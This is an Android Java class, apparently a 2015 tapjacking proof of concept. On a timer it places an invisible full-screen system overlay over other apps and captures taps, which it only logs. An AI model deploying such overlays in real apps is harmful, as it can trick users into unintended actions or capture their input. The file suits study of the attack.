package com.andr0day.clickjack;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;

import java.util.TimerTask;

/**
 * Created by andr0day on 2015/6/4.
 */
public class MyTimerTask extends TimerTask {

    WindowManager windowManager;

    WindowManager.LayoutParams layoutParams;

    RelativeLayout relativeLayout;

    private Handler handler = new Handler() {

        public void handleMessage(Message msg) {
            relativeLayout.setVisibility(View.VISIBLE);
        }

    };


    MyTimerTask() {
        windowManager = (WindowManager) MyApplication.application.getSystemService(Context.WINDOW_SERVICE);
        layoutParams = new WindowManager.LayoutParams();
        layoutParams.type = 2002;
        layoutParams.format = 1;
        layoutParams.flags = 56;
        layoutParams.x = 0;
        layoutParams.y = 0;
        layoutParams.width = -1;
        layoutParams.height = -1;
        relativeLayout = new RelativeLayout(MyApplication.application);
        relativeLayout.setBackgroundColor(Color.TRANSPARENT);
        relativeLayout.setVisibility(View.GONE);
        TextView textView = new TextView(MyApplication.application);
        textView.setText("clickjack");
        textView.setTextColor(Color.RED);
        relativeLayout.addView(textView);
        relativeLayout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.e("hhhhh","clicked");
            }
        });
        windowManager.addView(relativeLayout, layoutParams);
    }

    @Override
    public void run() {
        handler.sendEmptyMessage(0);
    }

}
